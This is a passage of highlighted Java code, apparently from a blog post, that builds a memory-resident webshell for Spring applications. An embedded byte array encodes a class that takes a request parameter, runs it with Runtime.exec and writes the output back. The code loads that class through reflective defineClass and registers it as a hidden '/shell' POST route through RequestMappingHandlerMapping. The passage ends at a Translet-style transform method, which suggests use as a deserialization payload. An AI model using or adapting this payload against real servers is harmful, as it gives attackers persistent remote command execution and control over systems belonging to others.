class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">104</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">47</span>, <span class="number">72</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">113</span>, <span class="number">117</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">104</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">47</span>, <span class="number">72</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">118</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">80</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">121</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">112</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">116</span>, <span class="number">121</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">116</span>, <span class="number">111</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">67</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">67</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">113</span>, <span class="number">117</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">90</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">40</span>, <span class="number">91</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">117</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">68</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">78</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">90</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">87</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">87</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">87</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">119</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">102</span>, <span class="number">108</span>, <span class="number">117</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">69</span>, <span class="number">114</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">40</span>, <span class="number">73</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">31</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">42</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">1</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">71</span>, <span class="number">43</span>, <span class="number">18</span>, <span class="number">2</span>, -<span class="number">71</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">0</span>, -<span class="number">58</span>, <span class="number">0</span>, -<span class="number">93</span>, <span class="number">4</span>, <span class="number">62</span>, <span class="number">18</span>, <span class="number">4</span>, -<span class="number">72</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">58</span>, <span class="number">4</span>, <span class="number">25</span>, <span class="number">4</span>, -<span class="number">58</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">25</span>, <span class="number">4</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">18</span>, <span class="number">7</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">8</span>, -<span class="number">103</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">62</span>, <span class="number">29</span>, -<span class="number">103</span>, <span class="number">0</span>, <span class="number">31</span>, <span class="number">6</span>, -<span class="number">67</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">89</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">4</span>, <span class="number">18</span>, <span class="number">11</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">5</span>, <span class="number">43</span>, <span class="number">18</span>, <span class="number">2</span>, -<span class="number">71</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">83</span>, -<span class="number">89</span>, <span class="number">0</span>, <span class="number">28</span>, <span class="number">6</span>, -<span class="number">67</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">89</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">12</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">4</span>, <span class="number">18</span>, <span class="number">13</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">5</span>, <span class="number">43</span>, <span class="number">18</span>, <span class="number">2</span>, -<span class="number">71</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">83</span>, <span class="number">58</span>, <span class="number">5</span>, -<span class="number">72</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">25</span>, <span class="number">5</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">15</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">58</span>, <span class="number">6</span>, -<span class="number">69</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">89</span>, <span class="number">25</span>, <span class="number">6</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">19</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">58</span>, <span class="number">7</span>, <span class="number">25</span>, <span class="number">7</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">21</span>, -<span class="number">103</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">25</span>, <span class="number">7</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">22</span>, -<span class="number">89</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">18</span>, <span class="number">23</span>, <span class="number">58</span>, <span class="number">8</span>, <span class="number">44</span>, -<span class="number">71</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">8</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">44</span>, -<span class="number">71</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">0</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">26</span>, -<span class="number">89</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">44</span>, <span class="number">17</span>, <span class="number">1</span>, -<span class="number">108</span>, -<span class="number">71</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">2</span>, <span class="number">0</span>, -<span class="number">89</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">78</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">76</span>, <span class="number">0</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">28</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">66</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">0</span>, <span class="number">99</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, -<span class="number">128</span>, <span class="number">0</span>, <span class="number">26</span>, <span class="number">0</span>, -<span class="number">108</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">0</span>, -<span class="number">97</span>, <span class="number">0</span>, <span class="number">28</span>, <span class="number">0</span>, -<span class="number">88</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">0</span>, -<span class="number">85</span>, <span class="number">0</span>, <span class="number">31</span>, <span class="number">0</span>, -<span class="number">76</span>, <span class="number">0</span>, <span class="number">34</span>, <span class="number">0</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, -<span class="number">72</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">92</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, -<span class="number">101</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">41</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">0</span>, -<span class="number">108</span>, <span class="number">0</span>, <span class="number">42</span>, <span class="number">0</span>, <span class="number">43</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">99</span>, <span class="number">0</span>, <span class="number">69</span>, <span class="number">0</span>, <span class="number">44</span>, <span class="number">0</span>, <span class="number">45</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">56</span>, <span class="number">0</span>, <span class="number">46</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, -<span class="number">128</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">0</span>, <span class="number">49</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, -<span class="number">108</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">0</span>, <span class="number">43</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">71</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">71</span>, <span class="number">0</span>, <span class="number">51</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">71</span>, <span class="number">0</span>, <span class="number">53</span>, <span class="number">0</span>, <span class="number">54</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">55</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, <span class="number">9</span>, -<span class="number">3</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">56</span>, <span class="number">31</span>, <span class="number">88</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">57</span>, -<span class="number">2</span>, <span class="number">0</span>, <span class="number">46</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">58</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">59</span>, <span class="number">65</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">56</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">60</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">61</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">62</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">66</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">63</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">64</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">51</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">53</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">66</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">67</span>, <span class="number">91</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">115</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">69</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">70</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">71</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">            java.lang.<span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">            java.lang.reflect.<span class="type">Method</span> <span class="variable">defineClass</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">            defineClass.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            defineClass.invoke(classLoader, className, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//获得当前代码运行时的上下文环境</span></span><br><span class="line">            <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">//从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean</span></span><br><span class="line">            <span class="type">RequestMappingHandlerMapping</span> <span class="variable">requestMappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//反射获取RequestMappingHandlerMapping的config字段</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">configField</span> <span class="operator">=</span> requestMappingHandlerMapping.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">            configField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">config</span> <span class="operator">=</span> (RequestMappingInfo.BuilderConfiguration) configField.get(requestMappingHandlerMapping);</span><br><span class="line">            <span class="comment">//通过反射获得自定义controller中唯一的Method对象</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> (Class.forName(className).getDeclaredMethods())[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">            <span class="comment">//设置路由的请求方法为POST</span></span><br><span class="line">            <span class="type">RequestMethod</span> <span class="variable">requestMethod</span> <span class="operator">=</span> RequestMethod.POST;</span><br><span class="line">            <span class="comment">//在内存中动态注册 controller</span></span><br><span class="line">            <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> RequestMappingInfo.paths(<span class="string">&quot;/shell&quot;</span>).methods(requestMethod).options(config).build();</span><br><span class="line">            requestMappingHandlerMapping.registerMapping(info, Class.forName(className).newInstance(), method);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> 